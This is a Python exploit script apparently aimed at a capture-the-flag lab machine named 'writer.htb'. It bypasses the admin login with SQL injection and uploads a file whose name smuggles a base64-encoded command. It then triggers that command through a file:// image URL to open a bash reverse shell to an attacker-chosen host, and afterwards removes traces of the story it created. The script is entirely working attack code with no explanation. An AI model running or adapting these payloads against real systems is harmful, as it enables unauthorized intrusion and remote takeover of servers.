import os
import re
import requests
import sys

from base64 import b64encode as b64e

if len(sys.argv) != 3:
    print(f'Usage: python3 {sys.argv[0]} <lhost> <lport>')
    exit(1)

lhost, lport = sys.argv[1:3]


def main():
    s = requests.session()
    s.post('http://10.10.11.101/administrative',
           data={'uname': "' or 1=1;-- -", 'password': 'asdf'})

    rev = f'bash -i  >& /dev/tcp/{lhost}/{lport} 0>&1'
    rm = 'rm /var/www/writer.htb/writer/static/img/fdsa*'
    command = b64e(f'{rm}; {rev}'.encode()).decode()

    filename = f'fdsa.jpg x;echo {command}|base64 -d|bash;'

    with open(filename, 'wb') as f:
        f.write(b'')

    s.post('http://10.10.11.101/dashboard/stories/add', data={
        'author': 'Me',
        'title': 'New story',
        'tagline': 'Tag',
        'image_url': '',
        'content': 'Nothing special'
    }, files={
        'image': open(filename, 'rb')
    })

    try:
        s.post(f'http://10.10.11.101/dashboard/stories/add', data={
            'author': 'Me',
            'title': 'New story',
            'tagline': 'Tag',
            'image_url': f'file:///var/www/writer.htb/writer/static/img/{filename}',
            'content': 'Nothing special'
        }, files={
            'image': ('', b'')
        }, timeout=2)
    except requests.exceptions.ReadTimeout:
        pass

    os.remove(filename)

    r = s.get('http://10.10.11.101/dashboard/stories')
    story_id = int(re.findall(r'<td>\s*(\d+)\s*</td>', r.text)[-1])

    if story_id > 8:
        s.post(f'http://10.10.11.101/dashboard/stories/delete/{story_id}')


if __name__ == '__main__':
    main()
